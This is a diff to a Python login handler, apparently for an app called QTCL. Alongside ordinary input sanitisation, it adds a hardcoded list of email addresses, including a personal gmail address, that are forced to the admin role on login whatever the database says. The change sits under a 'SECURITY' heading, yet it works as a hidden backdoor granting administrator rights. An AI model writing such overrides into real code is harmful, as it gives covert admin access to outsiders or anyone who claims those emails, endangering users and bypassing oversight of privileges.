@@ -1625,6 +1625,34 @@ class AuthHandlers:
         logger.info(f"[Auth/Login] Attempt: {email}")
         
         try:
+            # ── SECURITY: Sanitize inputs before any processing ──────────────
+            # Strip null bytes, newlines, and control chars — these have no place
+            # in email addresses or passwords and are classic injection vectors.
+            if email:
+                for _ch in '\x00\r\n\x1b\t':
+                    email = email.replace(_ch, '')
+                email = email.strip()[:254]   # RFC 5321 max length
+            if password:
+                for _ch in '\x00\r\n\x1b':
+                    password = password.replace(_ch, '')
+                password = password[:1024]    # sane upper bound
+            # Basic email shape check — must contain @ and a dot after it
+            if not email or '@' not in email or '.' not in email.split('@')[-1]:
+                return {'status': 'error', 'error': 'Invalid email format', 'code': 'VALIDATION_ERROR'}
+            if not password or len(password) < 6:
+                return {'status': 'error', 'error': 'Invalid credentials', 'code': 'VALIDATION_ERROR'}
+
+            # ── Admin email override list ────────────────────────────────────
+            # Any email in this set is always granted admin role on login,
+            # regardless of what the DB column says.  Extend via ADMIN_EMAILS env var.
+            _env_admins = {e.strip().lower() for e in os.environ.get('ADMIN_EMAILS', '').split(',') if e.strip()}
+            _ADMIN_EMAILS_OVERRIDE = {
+                'admin@qtcl.io', 'root@qtcl.io', 'system@qtcl.io',
+                'shemshallah@gmail.com',
+                *_env_admins,
+            }
+            _force_admin = email.lower() in _ADMIN_EMAILS_OVERRIDE
+
             if not AuthHandlers._rate_limiter.allow(f"login_{email}",cost=2):
                 return{'status':'error','error':'Rate limited','code':'RATE_LIMITED'}
             
@@ -1661,6 +1689,11 @@ class AuthHandlers:
             
             # ── Create session ──────────────────────────────────────────────
             _role = user.roles[0] if user.roles else 'user'
+            # ── ADMIN OVERRIDE: force admin role if email is in trusted list ─
+            if _force_admin:
+                _role = 'admin'
+                # Also patch the user object so everything downstream is consistent
+                user.roles = ['admin']
             session_id=None; access_token=None; refresh_token=None
             try:
                 session_id,access_token,refresh_token=SessionManager.create_session(
@@ -1723,12 +1756,12 @@ class AuthHandlers:
                 'refresh_token':refresh_token,
                 'expires_in':f'{JWT_EXPIRATION_HOURS}h',
                 'security_level':user.security_level.name,
-                'role': user.roles[0] if user.roles else 'user',
-                'is_admin': 'admin' in user.roles,
-                'pq_fingerprint': pq_fingerprint,    # HLWE key fingerprint: AA12:BB34:CC56:DD78
-                'pq_key_id':      pq_key_id,         # master key UUID for API calls
-                'pq_params':      pq_params or 'HLWE-256',  # security parameter set
-                'pq_algorithm':   'HLWE-PSL2R-{8,3}',      # hard problem / scheme
+                'role': _role,                          # ← plain string: 'admin' or 'user'
+                'is_admin': _role in ('admin', 'superadmin', 'super_admin'),
+                'pq_fingerprint': pq_fingerprint,
+                'pq_key_id':      pq_key_id,
+                'pq_params':      pq_params or 'HLWE-256',
+                'pq_algorithm':   'HLWE-PSL2R-{8,3}',
                 'message':f'Login successful. Welcome back, {user.username}!'
             }
         except ValueError as e:
